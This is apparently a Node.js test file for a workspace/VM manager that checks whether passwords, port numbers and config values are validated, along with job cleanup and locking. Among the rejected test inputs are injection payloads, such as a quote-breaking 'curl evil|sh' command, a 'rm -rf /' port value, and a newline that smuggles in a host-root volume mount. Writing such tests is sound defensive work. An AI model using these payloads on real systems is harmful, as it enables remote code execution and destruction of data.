// Values a caller supplies that end up in meta.env, a Dockerfile, a start hook
// or a port map (plan 122 #6, #7, #10, #13, #15).
const { it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pad-input-'));
process.env.WORKSPACE_ROOT = root;
process.env.PAD_DB_PATH = path.join(root, 'x.db');
const PAD = 'pad-input';
const inst = path.join(root, 'instances', PAD);
fs.mkdirSync(inst, { recursive: true });

const internal = require('../services/vm-manager/internal');
const jobLog = require('../services/job-log');

before(() => fs.writeFileSync(path.join(inst, 'meta.env'), 'AGENT=opencode\nROOT_PASSWORD=first\n'));
after(() => fs.rmSync(root, { recursive: true, force: true }));
const meta = () => fs.readFileSync(path.join(inst, 'meta.env'), 'utf8');

it('stores a value containing $ patterns exactly, on a first and on a later save', () => {
  for (const value of ['pa$$w0rd', "a$&b", "x$'y", 'p$`q', '$1$2']) {
    internal.setMetaFlag(PAD, 'ROOT_PASSWORD', value);   // replaces the existing line
    assert.ok(meta().includes(`ROOT_PASSWORD=${value}\n`), `stored ${value} verbatim, got: ${meta()}`);
  }
});

it('refuses to write a second line through a value', () => {
  assert.throws(() => internal.setMetaFlag(PAD, 'ROOT_PASSWORD', 'x\nEXTRA_VOLUMES=[{"host":"/","container":"/h"}]'), /line break/);
  assert.doesNotMatch(meta(), /EXTRA_VOLUMES/);
});

it('accepts ordinary passwords and refuses ones that can break out of where they are written', () => {
  for (const ok of ['', undefined, 'hunter2', 'pa$$w0rd!', 'with space', 'ünïcödé', 'a"b']) {
    assert.doesNotThrow(() => internal.assertRootPassword(ok));
    assert.doesNotThrow(() => internal.assertWebPassword(ok));
  }
  assert.throws(() => internal.assertRootPassword('a\nb'), /line break/);
  for (const bad of ["ab'cd", "x'; curl evil|sh; '", 'a\\b', 'a\nb', 'a\rb']) {
    assert.throws(() => internal.assertWebPassword(bad), /single quote, a backslash or a line break/, JSON.stringify(bad));
  }
});

it('accepts only a real port number', () => {
  for (const ok of ['', undefined, '22', 2222, '65535']) assert.doesNotThrow(() => internal.assertPort(ok));
  for (const bad of ['0', '65536', '22; rm -rf /', '2222 ', 'abc', '-1', '1e3']) assert.throws(() => internal.assertPort(bad, 'SSH port'), /SSH port must be a number/, String(bad));
});

it('a finished job cannot delete the newer job that took its name', async () => {
  const first = jobLog.createJob('update:pad-x');
  jobLog.finish(first, true);                 // schedules first's cleanup timer
  const second = jobLog.createJob('update:pad-x'); // a new build under the same key
  assert.notEqual(first, second);
  // Fire the first job's cleanup now instead of waiting five minutes.
  first.cleanupTimer._onTimeout();
  assert.equal(jobLog.getJob('update:pad-x'), second, 'the running job is still there');
});

it('refuses a second change set for a PAD while one is still being applied', async () => {
  const apply = require('../services/vm-manager/settings-apply');
  // The apply itself is replaced by a stand-in that this test controls. The
  // real one runs docker compose: an earlier version of this test let it, and
  // so built an image and created a container and a network called
  // 'pad-input' on the real host every time the suite ran.
  const pending = []; // one { resolve, reject } per apply that was let in, in order
  let calls = 0;
  apply._setApplyImpl(() => { calls += 1; return new Promise((resolve, reject) => { pending.push({ resolve, reject }); }); });
  try {
    const first = apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
    const second = await apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
    assert.equal(second.code, 'pad_change_in_progress');
    assert.equal(second.status, 409);
    assert.equal(calls, 1, 'the refused call must not have started a second apply');

    // Another PAD is not held up by this one.
    const other = apply.applyAgentChanges('pad-other', { force: true }).catch((e) => e);
    assert.equal(calls, 2);

    // The lock is released when the first one FAILS, not only when it succeeds.
    pending[0].reject(new Error('compose up failed'));
    assert.match((await first).message, /compose up failed/);
    pending[1].resolve('other done');
    assert.equal(await other, 'other done');
    const third = apply.applyAgentChanges(PAD, { force: true }).catch((e) => e);
    assert.equal(calls, 3, 'a new apply for the same PAD starts once the first is over');
    pending[2].resolve('ok');
    assert.equal(await third, 'ok');
  } finally {
    apply._setApplyImpl(null);
  }
});
